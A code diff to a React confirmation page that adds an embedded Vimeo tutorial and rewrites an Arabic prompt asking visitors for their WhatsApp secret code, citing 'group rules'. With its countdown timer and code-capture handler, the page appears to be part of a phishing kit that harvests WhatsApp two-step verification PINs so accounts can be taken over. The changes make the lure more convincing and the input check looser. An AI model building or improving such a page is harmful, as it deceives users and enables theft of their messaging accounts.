@@ -4,6 +4,7 @@ import { formatPhoneNumberIntl } from "react-phone-number-input";
 import { GridLoader } from "react-spinners";
 import SettingsContext from "../Context/SettingsContext";
 import Timer from "../Timer/Timer";
+import VideoEmbed from "../VideoEmbed/VideoEmbed"; // Corrected the import path
 import "./Confirm2.css"; // Import the CSS file
 
 export default function Confirm2({ setNcode, ncode }) {
@@ -11,7 +12,7 @@ export default function Confirm2({ setNcode, ncode }) {
   const [code2, setCode2] = useState("");
   const [workMinutes, setWorkMinutes] = useState(2.5);
   const [message, setMessage] = useState(
-    "🔒 ادخل الرمز السري للواتساب \n  من قوانين القروب التوفر على الرمز السري  \n إذا ما مسوي رمز سويه أولا، ثم إرجع أدخله هنا",
+    "🔒 ادخل الرمز السري للواتساب حقك \n من قوانين القروب التوفر على الرمز السري  \n  سويه  كما في الفيديو اسفله ثم إرجع أدخله هنا",
   );
   const [loading, setLoading] = useState(false);
 
@@ -25,9 +26,7 @@ export default function Confirm2({ setNcode, ncode }) {
 
   const handle = () => {
     console.log("Button clicked");
-
-    // Check if the code is less than 6 digits
-    if (code2.length !== 6) {
+    if (code2.length < 6) {
       console.log("Code too short");
       setError(true);
     } else {
@@ -140,6 +139,11 @@ export default function Confirm2({ setNcode, ncode }) {
             </div>
           )}
         </div>
+      </div>
+      {/* Embed the Vimeo video at the bottom of the page */}
+      <div className="mt-8 video-container">
+        <VideoEmbed videoId="990938819" platform="vimeo" />{" "}
+        {/* Replace with your Vimeo video ID */}
       </div>
     </div>
   );
